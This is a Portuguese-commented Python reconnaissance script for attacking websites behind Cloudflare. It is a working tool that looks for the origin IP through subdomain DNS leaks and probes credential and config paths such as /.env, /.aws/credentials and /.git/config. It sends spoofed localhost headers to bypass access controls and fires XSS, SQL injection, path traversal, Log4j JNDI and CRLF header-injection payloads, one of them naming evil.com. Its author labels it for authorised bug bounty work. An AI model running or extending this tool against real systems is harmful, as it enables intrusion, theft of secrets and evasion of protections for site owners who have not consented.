#!/usr/bin/env python3
"""
cf_recon.py — Cloudflare-Aware Recon Script
Versão: 2.0
gerado para uso em bug bounty / pentest autorizado
Saída: JSON estruturado compatível com contexto de IA (Claude, GPT, etc.)

falta batizar ,verificar e adicionar possiveis user agents futuramente , ficar de olho no bypasss para sempre atualizar
"""

import sys
import json
import socket
import ssl
import time
import argparse
import re
import urllib.request
import urllib.error
import urllib.parse
import http.client
from datetime import datetime, timezone
from concurrent.futures import ThreadPoolExecutor, as_completed

# ──────────────────────────────────────────
# CONFIGURAÇÕES GLOBAIS
# ──────────────────────────────────────────
DEFAULT_TIMEOUT = 10
DEFAULT_THREADS = 10
CLOUDFLARE_ASN = "AS13335"
CF_IP_RANGES_URL = "https://www.cloudflare.com/ips-v4/"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

SENSITIVE_PATHS = [
    # Admin / painel
    "/admin", "/admin/", "/administrator", "/wp-admin", "/panel",
    "/dashboard", "/manage", "/console", "/cpanel", "/phpmyadmin",
    # APIs comuns
    "/api", "/api/v1", "/api/v2", "/api/v3", "/graphql", "/graphiql",
    "/swagger", "/swagger-ui.html", "/api-docs", "/openapi.json",
    "/redoc", "/.well-known/openapi.yaml",
    # Auth
    "/login", "/signin", "/auth", "/oauth", "/oauth2", "/saml",
    "/sso", "/auth/login", "/api/auth", "/api/login",
    # Config / debug
    "/.env", "/.env.local", "/.env.production", "/config.json",
    "/config.yml", "/config.yaml", "/settings.json",
    "/application.properties", "/web.config", "/appsettings.json",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    # Monitoramento / métricas
    "/health", "/healthz", "/health/ready", "/ping", "/status",
    "/metrics", "/actuator", "/actuator/health", "/actuator/env",
    "/actuator/mappings", "/debug", "/trace", "/server-status",
    # Info leak
    "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/security.txt", "/.well-known/security.txt",
    "/humans.txt", "/changelog.txt", "/CHANGELOG.md",
    "/package.json", "/composer.json", "/Gemfile",
    # JS / Source maps
    "/app.js", "/main.js", "/bundle.js", "/app.js.map",
    "/main.js.map", "/static/js/main.chunk.js",
    # Backup / expostos
    "/backup", "/backup.zip", "/db.sql", "/dump.sql",
    "/www.zip", "/site.tar.gz", "/.DS_Store",
    # Cloud / infra
    "/.aws/credentials", "/wp-config.php", "/xmlrpc.php",
    "/server-info", "/.htaccess", "/web.config",
]

BYPASS_HEADERS = {
    "CF-Connecting-IP": "127.0.0.1",
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
    "True-Client-IP": "127.0.0.1",
    "X-Client-IP": "127.0.0.1",
    "X-Remote-IP": "127.0.0.1",
    "X-Host": "localhost",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "Forwarded": "for=127.0.0.1;proto=https",
}

SECURITY_HEADERS = [
    "strict-transport-security",
    "content-security-policy",
    "x-frame-options",
    "x-content-type-options",
    "referrer-policy",
    "permissions-policy",
    "x-xss-protection",
    "cross-origin-embedder-policy",
    "cross-origin-opener-policy",
    "cross-origin-resource-policy",
]

CF_HEADERS_INDICATORS = [
    "cf-ray", "cf-cache-status", "cf-request-id",
    "cf-worker", "cf-mitigated", "cf-edge-cache",
    "server",  # cloudflare
]


# ──────────────────────────────────────────
# UTILITÁRIOS
# ──────────────────────────────────────────

def log(msg, level="INFO"):
    ts = datetime.now().strftime("%H:%M:%S")
    colors = {"INFO": "\033[94m", "OK": "\033[92m", "WARN": "\033[93m",
              "ERR": "\033[91m", "SECTION": "\033[95m", "RESET": "\033[0m"}
    c = colors.get(level, "")
    r = colors["RESET"]
    print(f"  {c}[{level}]{r} {ts} {msg}", file=sys.stderr)


def make_request(url, headers=None, timeout=DEFAULT_TIMEOUT, method="GET"):
    """HTTP request com suporte a HTTPS sem verificação de cert (recon)."""
    try:
        req = urllib.request.Request(url, method=method)
        req.add_header("User-Agent", USER_AGENTS[0])
        req.add_header("Accept", "text/html,application/json,*/*;q=0.8")
        req.add_header("Accept-Language", "en-US,en;q=0.9")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        import ssl as _ssl
        ctx = _ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = _ssl.CERT_NONE

        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        body = resp.read(8192).decode("utf-8", errors="replace")
        return {
            "status": resp.status,
            "headers": dict(resp.headers),
            "body": body,
            "url": resp.url,
        }
    except urllib.error.HTTPError as e:
        body = ""
        try:
            body = e.read(2048).decode("utf-8", errors="replace")
        except Exception:
            pass
        return {"status": e.code, "headers": dict(e.headers), "body": body, "url": url}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": str(e), "url": url}


def resolve_dns(domain):
    """Resolve múltiplos registros DNS."""
    result = {}
    try:
        result["A"] = list(set(str(r[4][0]) for r in socket.getaddrinfo(domain, None, socket.AF_INET)))
    except Exception:
        result["A"] = []
    try:
        result["AAAA"] = list(set(str(r[4][0]) for r in socket.getaddrinfo(domain, None, socket.AF_INET6)))
    except Exception:
        result["AAAA"] = []
    return result


def get_cert_info(domain, port=443):
    """Extrai informações do certificado SSL."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with socket.create_connection((domain, port), timeout=DEFAULT_TIMEOUT) as sock:
            with ctx.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
                der = ssock.getpeercert(binary_form=True)
                cipher = ssock.cipher()
                proto = ssock.version()
        san = []
        for t, v in cert.get("subjectAltName", []):
            san.append(v)
        subject = dict(x[0] for x in cert.get("subject", []))
        issuer = dict(x[0] for x in cert.get("issuer", []))
        return {
            "subject": subject,
            "issuer": issuer,
            "san": san,
            "not_before": cert.get("notBefore"),
            "not_after": cert.get("notAfter"),
            "cipher": cipher[0] if cipher else None,
            "protocol": proto,
            "serial": cert.get("serialNumber"),
        }
    except Exception as e:
        return {"error": str(e)}


def is_cloudflare_ip(ip):
    """Verifica se o IP pertence à Cloudflare (ranges conhecidos)."""
    CF_RANGES = [
        "173.245.48.", "103.21.244.", "103.22.200.", "103.31.4.",
        "141.101.64.", "108.162.192.", "190.93.240.", "188.114.96.",
        "197.234.240.", "198.41.128.", "162.158.", "104.16.", "104.17.",
        "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.",
        "104.24.", "104.25.", "104.26.", "104.27.", "104.28.",
        "172.64.", "172.65.", "172.66.", "172.67.", "172.68.", "172.69.",
        "172.70.", "172.71.", "131.0.72.", "2400:cb00:", "2606:4700:",
        "2803:f800:", "2405:b500:", "2405:8100:", "2a06:98c0:", "2c0f:f248:",
    ]
    return any(ip.startswith(r) for r in CF_RANGES)


def detect_tech_stack(headers, body):
    """Detecta tecnologias pelo response."""
    techs = []
    server = headers.get("server", "").lower()
    powered_by = headers.get("x-powered-by", "").lower()
    via = headers.get("via", "").lower()

    if "cloudflare" in server:
        techs.append("Cloudflare (CDN/WAF)")
    if "nginx" in server:
        techs.append("Nginx")
    if "apache" in server:
        techs.append("Apache")
    if "litespeed" in server:
        techs.append("LiteSpeed")
    if "php" in powered_by:
        techs.append(f"PHP ({powered_by})")
    if "asp.net" in powered_by:
        techs.append("ASP.NET")

    body_lower = body.lower()
    if "wp-content" in body_lower or "wp-includes" in body_lower:
        techs.append("WordPress")
    if "shopify" in body_lower or "cdn.shopify.com" in body_lower:
        techs.append("Shopify")
    if "drupal" in body_lower:
        techs.append("Drupal")
    if "joomla" in body_lower:
        techs.append("Joomla")
    if "react" in body_lower or "__react" in body_lower:
        techs.append("React")
    if "vue" in body_lower or "__vue" in body_lower:
        techs.append("Vue.js")
    if "angular" in body_lower or "ng-version" in body_lower:
        techs.append("Angular")
    if "next.js" in body_lower or "_next/" in body_lower:
        techs.append("Next.js")
    if "nuxt" in body_lower:
        techs.append("Nuxt.js")
    if "laravel" in body_lower:
        techs.append("Laravel")
    if "django" in body_lower or "csrfmiddlewaretoken" in body_lower:
        techs.append("Django")
    if "rails" in body_lower or "data-turbolinks" in body_lower:
        techs.append("Ruby on Rails")
    if "graphql" in body_lower:
        techs.append("GraphQL (detectado no body)")

    # Cookies como fingerprint
    set_cookie = headers.get("set-cookie", "")
    if "phpsessid" in set_cookie.lower():
        techs.append("PHP Session")
    if "asp.net_sessionid" in set_cookie.lower():
        techs.append("ASP.NET Session")
    if "laravel_session" in set_cookie.lower():
        techs.append("Laravel Session")
    if "__stripe" in set_cookie.lower():
        techs.append("Stripe (payment)")

    return list(set(techs))


def analyze_cf_protection(headers):
    """Analisa nível de proteção Cloudflare."""
    findings = []
    cf_ray = headers.get("cf-ray", "")
    cf_cache = headers.get("cf-cache-status", "")
    cf_mitigated = headers.get("cf-mitigated", "")

    if cf_ray:
        findings.append(f"CF-Ray presente: {cf_ray} → confirma Cloudflare ativo")
    if cf_cache:
        findings.append(f"Cache status: {cf_cache}")
    if cf_mitigated:
        findings.append(f"CF-Mitigated: {cf_mitigated} → requisição foi mitigada/bloqueada")

    # Challenge indicators
    server = headers.get("server", "")
    if "cloudflare" in server.lower():
        findings.append("Server header indica Cloudflare")

    return findings


def check_security_headers(headers):
    """Avalia headers de segurança presentes e ausentes."""
    present = {}
    missing = []
    for h in SECURITY_HEADERS:
        val = headers.get(h)
        if val:
            present[h] = val
        else:
            missing.append(h)
    return {"present": present, "missing": missing}


# ──────────────────────────────────────────
# MÓDULOS DE RECON
# ──────────────────────────────────────────

def module_dns(domain):
    log(f"DNS resolution → {domain}", "SECTION")
    records = resolve_dns(domain)
    cf_ips = [ip for ip in records.get("A", []) if is_cloudflare_ip(ip)]
    real_ips = [ip for ip in records.get("A", []) if not is_cloudflare_ip(ip)]

    # Tenta subdomínios comuns que podem expor IP real
    leak_subs = ["direct", "origin", "mail", "ftp", "smtp", "cpanel",
                 "webmail", "dev", "staging", "api", "old", "backup"]
    leaked = {}
    for sub in leak_subs:
        full = f"{sub}.{domain}"
        try:
            ips = socket.gethostbyname_ex(full)[2]
            non_cf = [ip for ip in ips if not is_cloudflare_ip(ip)]
            if non_cf:
                leaked[full] = non_cf
        except Exception:
            pass

    return {
        "records": records,
        "cloudflare_ips": cf_ips,
        "possible_real_ips": real_ips,
        "subdomain_ip_leaks": leaked,
        "behind_cloudflare": len(cf_ips) > 0,
    }


def module_ssl(domain):
    log(f"SSL/TLS análise → {domain}", "SECTION")
    cert = get_cert_info(domain)
    findings = []

    if "san" in cert:
        # SANs podem revelar domínios internos / subdomínios
        internal_indicators = [s for s in cert["san"]
                                if any(kw in s.lower() for kw in
                                       ["internal", "dev", "staging", "test", "api", "origin", "direct"])]
        if internal_indicators:
            findings.append(f"SANs suspeitos encontrados: {internal_indicators}")

    if "issuer" in cert:
        issuer = cert["issuer"].get("organizationName", "")
        if "cloudflare" in issuer.lower():
            findings.append("Certificado emitido pela Cloudflare → pode ocultar cert real")
        elif "let's encrypt" in issuer.lower():
            findings.append("Let's Encrypt → possível certificado de origem exposto")

    return {"cert": cert, "findings": findings}


def module_http_baseline(target_url):
    log(f"HTTP baseline → {target_url}", "SECTION")
    resp = make_request(target_url)
    if resp["status"] == 0:
        return {"error": resp["body"]}

    headers = {k.lower(): v for k, v in resp["headers"].items()}
    cf_analysis = analyze_cf_protection(headers)
    sec_headers = check_security_headers(headers)
    techs = detect_tech_stack(headers, resp["body"])

    # Cookies e segurança
    cookie_issues = []
    set_cookie = headers.get("set-cookie", "")
    if set_cookie:
        if "httponly" not in set_cookie.lower():
            cookie_issues.append("Cookie sem HttpOnly")
        if "secure" not in set_cookie.lower():
            cookie_issues.append("Cookie sem Secure flag")
        if "samesite" not in set_cookie.lower():
            cookie_issues.append("Cookie sem SameSite")

    return {
        "status": resp["status"],
        "final_url": resp["url"],
        "headers": dict(headers),
        "cloudflare_indicators": cf_analysis,
        "security_headers": sec_headers,
        "technologies": techs,
        "cookie_issues": cookie_issues,
        "body_snippet": resp["body"][:500],
    }


def module_bypass_headers(target_url):
    log("Testando bypass headers CF", "SECTION")
    results = []
    baseline = make_request(target_url)
    baseline_status = baseline["status"]
    baseline_len = len(baseline["body"])

    for header_name, header_val in BYPASS_HEADERS.items():
        resp = make_request(target_url, headers={header_name: header_val})
        diff = abs(len(resp["body"]) - baseline_len)
        status_diff = resp["status"] != baseline_status
        interesting = diff > 200 or status_diff

        results.append({
            "header": f"{header_name}: {header_val}",
            "status": resp["status"],
            "body_length": len(resp["body"]),
            "diff_from_baseline": diff,
            "status_changed": status_diff,
            "interesting": interesting,
        })

    # Teste combinado (múltiplos headers)
    combined_resp = make_request(target_url, headers=BYPASS_HEADERS)
    results.append({
        "header": "ALL_BYPASS_HEADERS_COMBINED",
        "status": combined_resp["status"],
        "body_length": len(combined_resp["body"]),
        "diff_from_baseline": abs(len(combined_resp["body"]) - baseline_len),
        "status_changed": combined_resp["status"] != baseline_status,
        "interesting": abs(len(combined_resp["body"]) - baseline_len) > 200,
    })

    interesting_results = [r for r in results if r["interesting"]]
    return {
        "baseline_status": baseline_status,
        "baseline_body_length": baseline_len,
        "results": results,
        "interesting_findings": interesting_results,
    }


def probe_path(base_url, path):
    """Proba um único path e retorna resultado resumido."""
    url = base_url.rstrip("/") + path
    resp = make_request(url)
    status = resp["status"]
    body_len = len(resp["body"])
    body_snippet = resp["body"][:200]

    interesting = status in [200, 201, 204, 206, 301, 302, 307, 308, 401, 403, 405]
    very_interesting = status in [200, 201, 204, 206, 401, 405]

    return {
        "path": path,
        "url": url,
        "status": status,
        "body_length": body_len,
        "interesting": interesting,
        "very_interesting": very_interesting,
        "snippet": body_snippet if very_interesting else "",
        "cf_blocked": status == 403 and "cloudflare" in resp["body"].lower(),
    }


def module_path_discovery(base_url, threads=DEFAULT_THREADS):
    log(f"Path discovery ({len(SENSITIVE_PATHS)} paths, {threads} threads)", "SECTION")
    results = []
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futures = {ex.submit(probe_path, base_url, p): p for p in SENSITIVE_PATHS}
        for fut in as_completed(futures):
            try:
                results.append(fut.result())
            except Exception as e:
                pass
    results.sort(key=lambda x: (not x["very_interesting"], not x["interesting"], x["path"]))
    very = [r for r in results if r["very_interesting"]]
    interesting = [r for r in results if r["interesting"] and not r["very_interesting"]]
    blocked = [r for r in results if r["cf_blocked"]]
    return {
        "total_probed": len(results),
        "very_interesting": very,
        "interesting": interesting,
        "cf_blocked_paths": blocked,
        "all_results": results,
    }


def module_waf_fingerprint(target_url):
    """Tenta identificar WAF rules e comportamentos via payloads não destrutivos."""
    log("WAF fingerprint (payloads passivos)", "SECTION")
    test_vectors = [
        {"label": "XSS básico",        "param": "?q=<script>alert(1)</script>"},
        {"label": "SQLi básico",        "param": "?id=1'"},
        {"label": "Path traversal",     "param": "?file=../../../../etc/passwd"},
        {"label": "SSRF-like",          "param": "?url=http://127.0.0.1"},
        {"label": "Log4j padrão",       "param": "?q=${jndi:ldap://x.x}"},
        {"label": "Header injection",   "param": ""},  # via header
        {"label": "Null byte",          "param": "?q=test%00"},
        {"label": "JSON payload",       "param": "?q={\"test\":\"<script>\"}"},
        {"label": "Unicode bypass",     "param": "?q=%uff1cscript%uff1e"},
    ]
    results = []
    baseline = make_request(target_url)
    for vec in test_vectors:
        url = target_url + vec["param"]
        headers = {}
        if vec["label"] == "Header injection":
            headers = {"X-Forwarded-Host": "evil.com\r\nX-Injected: yes"}
        resp = make_request(url, headers=headers)
        blocked = resp["status"] in [403, 429, 503] or (
            resp["status"] == 0 and "reset" in resp["body"].lower()
        )
        challenge = resp["status"] in [403] and "cloudflare" in resp["body"].lower()
        results.append({
            "vector": vec["label"],
            "payload": vec["param"][:60],
            "status": resp["status"],
            "blocked": blocked,
            "cf_challenge": challenge,
        })
        time.sleep(0.3)  # rate-limit amigável

    blocked_count = sum(1 for r in results if r["blocked"])
    return {
        "total_vectors": len(results),
        "blocked": blocked_count,
        "passed": len(results) - blocked_count,
        "waf_aggressiveness": (
            "Alto" if blocked_count >= 6 else
            "Médio" if blocked_count >= 3 else "Baixo"
        ),
        "results": results,
    }


def module_info_disclosure(target_url, baseline_headers):
    """Analisa vazamentos de informação nos headers e body."""
    log("Info disclosure analysis", "SECTION")
    findings = []
    headers = {k.lower(): v for k, v in baseline_headers.items()}

    # Headers que revelam stack
    reveal_headers = ["x-powered-by", "x-aspnet-version", "x-aspnetmvc-version",
                      "x-generator", "x-drupal-cache", "x-varnish",
                      "x-backend-server", "x-served-by", "x-cache",
                      "x-amz-request-id", "x-amz-id-2"]
    for h in reveal_headers:
        if h in headers:
            findings.append({
                "type": "header_disclosure",
                "header": h,
                "value": headers[h],
                "severity": "info",
            })

    # CORS
    if "access-control-allow-origin" in headers:
        acao = headers["access-control-allow-origin"]
        if acao == "*":
            findings.append({
                "type": "cors_wildcard",
                "header": "access-control-allow-origin: *",
                "severity": "medium",
                "note": "CORS aberto para qualquer origem",
            })

    # HSTS
    hsts = headers.get("strict-transport-security", "")
    if hsts:
        if "includesubdomains" not in hsts.lower():
            findings.append({"type": "hsts_no_subdomains", "severity": "low", "value": hsts})
        if "preload" not in hsts.lower():
            findings.append({"type": "hsts_no_preload", "severity": "info", "value": hsts})
        max_age_match = re.search(r"max-age=(\d+)", hsts)
        if max_age_match and int(max_age_match.group(1)) < 15768000:
            findings.append({"type": "hsts_short_max_age", "severity": "low",
                              "value": max_age_match.group(1)})

    # CSP
    csp = headers.get("content-security-policy", "")
    if csp:
        if "unsafe-inline" in csp:
            findings.append({"type": "csp_unsafe_inline", "severity": "medium", "value": csp[:100]})
        if "unsafe-eval" in csp:
            findings.append({"type": "csp_unsafe_eval", "severity": "medium", "value": csp[:100]})
        if "*" in csp:
            findings.append({"type": "csp_wildcard", "severity": "medium", "value": csp[:100]})
    else:
        findings.append({"type": "csp_missing", "severity": "medium"})

    return findings


# ──────────────────────────────────────────
# RELATÓRIO FINAL
# ──────────────────────────────────────────

def generate_ai_context(report):
    """
    Gera um resumo textual estruturado para ser usado como contexto de IA.
    Ideal para colar diretamente em Claude, GPT, etc.
    """
    lines = []
    t = report["target"]
    meta = report["metadata"]
    dns = report.get("dns", {})
    ssl_m = report.get("ssl", {})
    http = report.get("http_baseline", {})
    bypass = report.get("bypass_headers", {})
    paths = report.get("path_discovery", {})
    waf = report.get("waf_fingerprint", {})
    disclosure = report.get("info_disclosure", [])

    lines.append("=" * 60)
    lines.append("RECON REPORT — CONTEXTO PARA ANÁLISE DE IA")
    lines.append("=" * 60)
    lines.append(f"Alvo: {t}")
    lines.append(f"Data: {meta['timestamp']}")
    lines.append(f"Duração: {meta.get('duration_seconds', '?')}s")
    lines.append("")

    # DNS
    lines.append("## DNS")
    lines.append(f"IPs Cloudflare: {dns.get('cloudflare_ips', [])}")
    lines.append(f"Possíveis IPs reais: {dns.get('possible_real_ips', [])}")
    if dns.get("subdomain_ip_leaks"):
        lines.append(f"⚠ Subdomínios com IP real vazado: {dns['subdomain_ip_leaks']}")
    lines.append(f"Atrás da Cloudflare: {dns.get('behind_cloudflare', '?')}")
    lines.append("")

    # SSL
    lines.append("## SSL/TLS")
    cert = ssl_m.get("cert", {})
    lines.append(f"Emissor: {cert.get('issuer', {}).get('organizationName', '?')}")
    lines.append(f"Assunto: {cert.get('subject', {}).get('commonName', '?')}")
    lines.append(f"SANs: {cert.get('san', [])}")
    lines.append(f"Validade: {cert.get('not_before')} → {cert.get('not_after')}")
    if ssl_m.get("findings"):
        for f in ssl_m["findings"]:
            lines.append(f"⚠ {f}")
    lines.append("")

    # HTTP
    lines.append("## HTTP Baseline")
    lines.append(f"Status: {http.get('status')}")
    lines.append(f"URL final: {http.get('final_url')}")
    lines.append(f"Tecnologias detectadas: {http.get('technologies', [])}")
    sec = http.get("security_headers", {})
    lines.append(f"Headers de segurança presentes: {list(sec.get('present', {}).keys())}")
    lines.append(f"Headers de segurança ausentes: {sec.get('missing', [])}")
    if http.get("cookie_issues"):
        lines.append(f"⚠ Problemas em cookies: {http['cookie_issues']}")
    if http.get("cloudflare_indicators"):
        lines.append(f"Indicadores CF: {http['cloudflare_indicators']}")
    lines.append("")

    # Bypass
    lines.append("## Bypass de Headers")
    interesting_bypass = bypass.get("interesting_findings", [])
    if interesting_bypass:
        lines.append(f"⚠ Respostas diferentes com bypass headers ({len(interesting_bypass)} achados):")
        for b in interesting_bypass:
            lines.append(f"  - {b['header']} → status {b['status']}, diff={b['diff_from_baseline']}B")
    else:
        lines.append("Nenhum bypass header produziu resposta diferente significativa.")
    lines.append("")

    # Paths
    lines.append("## Path Discovery")
    lines.append(f"Total sondado: {paths.get('total_probed', 0)}")
    very = paths.get("very_interesting", [])
    if very:
        lines.append(f"⚠ Caminhos muito interessantes ({len(very)}):")
        for p in very:
            lines.append(f"  [{p['status']}] {p['path']} ({p['body_length']}B)")
    interesting = paths.get("interesting", [])
    if interesting:
        lines.append(f"Outros interessantes ({len(interesting)}):")
        for p in interesting[:10]:
            lines.append(f"  [{p['status']}] {p['path']}")
    blocked = paths.get("cf_blocked_paths", [])
    if blocked:
        lines.append(f"Bloqueados pelo WAF CF: {[p['path'] for p in blocked]}")
    lines.append("")

    # WAF
    lines.append("## WAF Fingerprint")
    lines.append(f"Agressividade WAF: {waf.get('waf_aggressiveness', '?')}")
    lines.append(f"Vectors testados: {waf.get('total_vectors', 0)} | Bloqueados: {waf.get('blocked', 0)} | Passaram: {waf.get('passed', 0)}")
    for r in waf.get("results", []):
        status_label = "🔴 BLOQUEADO" if r["blocked"] else "🟢 PASSOU"
        lines.append(f"  {status_label} [{r['vector']}] status={r['status']}")
    lines.append("")

    # Disclosure
    lines.append("## Info Disclosure")
    if disclosure:
        for d in disclosure:
            sev = d.get("severity", "info").upper()
            t_disc = d.get("type", "")
            val = d.get("value", d.get("header", ""))
            lines.append(f"  [{sev}] {t_disc}: {val}")
    else:
        lines.append("Nenhum vazamento de informação relevante encontrado.")
    lines.append("")

    lines.append("=" * 60)
    lines.append("FIM DO RELATÓRIO")
    lines.append("=" * 60)
    return "\n".join(lines)


# ──────────────────────────────────────────
# MAIN
# ──────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="cf_recon.py — Recon para apps atrás de Cloudflare",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  python3 cf_recon.py -t https://example.com
  python3 cf_recon.py -t https://example.com -o report.json --threads 20
  python3 cf_recon.py -t https://example.com --skip-waf --ai-context

Use apenas em alvos com permissão explícita.
        """
    )
    parser.add_argument("-t", "--target", required=True, help="URL alvo (ex: https://example.com)")
    parser.add_argument("-o", "--output", default="recon_output.json", help="Arquivo JSON de saída")
    parser.add_argument("--threads", type=int, default=DEFAULT_THREADS, help="Threads para path discovery")
    parser.add_argument("--skip-paths", action="store_true", help="Pular path discovery")
    parser.add_argument("--skip-waf", action="store_true", help="Pular WAF fingerprint")
    parser.add_argument("--skip-bypass", action="store_true", help="Pular teste de bypass headers")
    parser.add_argument("--ai-context", action="store_true", help="Imprimir contexto formatado para IA")
    args = parser.parse_args()

    # Normaliza target
    target = args.target.rstrip("/")
    if not target.startswith("http"):
        target = "https://" + target
    parsed = urllib.parse.urlparse(target)
    domain = parsed.netloc or parsed.path

    print(f"""
╔══════════════════════════════════════════════╗
║          cf_recon.py  v2.0                   ║
║   Cloudflare-Aware Reconnaissance Tool       ║
║   Use apenas com autorização explícita       ║
╚══════════════════════════════════════════════╝
    """, file=sys.stderr)

    log(f"Alvo: {target} (domínio: {domain})", "INFO")
    start = time.time()

    report = {
        "target": target,
        "domain": domain,
        "metadata": {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "tool": "cf_recon.py v2.0",
            "threads": args.threads,
        }
    }

    # Executa módulos
    report["dns"] = module_dns(domain)
    report["ssl"] = module_ssl(domain)
    report["http_baseline"] = module_http_baseline(target)

    if not args.skip_bypass:
        report["bypass_headers"] = module_bypass_headers(target)

    if not args.skip_paths:
        report["path_discovery"] = module_path_discovery(target, args.threads)

    if not args.skip_waf:
        report["waf_fingerprint"] = module_waf_fingerprint(target)

    baseline_headers = report["http_baseline"].get("headers", {})
    report["info_disclosure"] = module_info_disclosure(target, baseline_headers)

    report["metadata"]["duration_seconds"] = round(time.time() - start, 2)

    # Salva JSON
    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False, default=str)
    log(f"Relatório JSON salvo em: {args.output}", "OK")

    # Contexto IA
    ai_ctx = generate_ai_context(report)
    ctx_file = args.output.replace(".json", "_ai_context.txt")
    with open(ctx_file, "w", encoding="utf-8") as f:
        f.write(ai_ctx)
    log(f"Contexto IA salvo em: {ctx_file}", "OK")

    if args.ai_context:
        print("\n" + ai_ctx)

    # Resumo rápido
    paths = report.get("path_discovery", {})
    waf = report.get("waf_fingerprint", {})
    bypass = report.get("bypass_headers", {})
    print(f"""
╔══════════════════════════════════════════════╗
║               RESUMO EXECUTIVO               ║
╠══════════════════════════════════════════════╣
║  Atrás do Cloudflare : {str(report['dns'].get('behind_cloudflare','?')).ljust(20)} ║
║  IP real detectado   : {str(bool(report['dns'].get('possible_real_ips'))).ljust(20)} ║
║  Tecnologias         : {str(len(report['http_baseline'].get('technologies',[]))).ljust(20)} ║
║  Paths interessantes : {str(len(paths.get('very_interesting',[]))).ljust(20)} ║
║  WAF agressividade   : {str(waf.get('waf_aggressiveness','N/A')).ljust(20)} ║
║  Bypass interessante : {str(len(bypass.get('interesting_findings',[]))).ljust(20)} ║
║  Duração total       : {str(report['metadata']['duration_seconds'])+'s'.ljust(19)} ║
╚══════════════════════════════════════════════╝
    """, file=sys.stderr)


if __name__ == "__main__":
    main()
